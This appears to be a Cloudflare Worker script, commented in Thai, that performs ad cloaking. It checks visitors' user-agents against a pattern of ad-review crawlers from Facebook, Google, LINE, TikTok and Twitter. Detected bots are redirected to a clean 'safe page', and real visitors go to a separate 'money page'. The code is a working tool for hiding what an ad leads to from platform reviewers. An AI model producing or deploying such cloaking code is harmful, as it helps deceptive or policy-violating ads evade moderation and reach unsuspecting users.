export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get('user-agent') || '';
    
    // รายชื่อคำสำหรับดักจับบอทตรวจแอดของทุกค่าย (Facebook, Google, LINE, TikTok, Twitter)
    const botPattern = /facebookexternalhit|Facebot|MetaInspector|facebookcatalog|Googlebot|AdsBot-Google|Mediapartners-Google|Google-Adwords|Google-PageRenderer|Line-poker|Linespider|TikTokSpider|ByteSpider|Twitterbot/i;

    // เช็กว่าคนที่เข้ามาตรงกับคีย์เวิร์ดของบอทหรือไม่
    const isBot = botPattern.test(userAgent);

    // กำหนดลิงก์ปลายทาง
    const safePage = 'https://skipme.link/add-line'; // สำหรับบอท (หน้าขาวสะอาด)
    const moneyPage = 'https://skipme.link/toweb';   // สำหรับคนจริง

    if (isBot) {
      // ส่งบอทไปหน้า Safe Page
      return Response.redirect(safePage, 302);
    } else {
      // ส่งคนจริงไปหน้า Money Page
      return Response.redirect(moneyPage, 302);
    }
  }
};
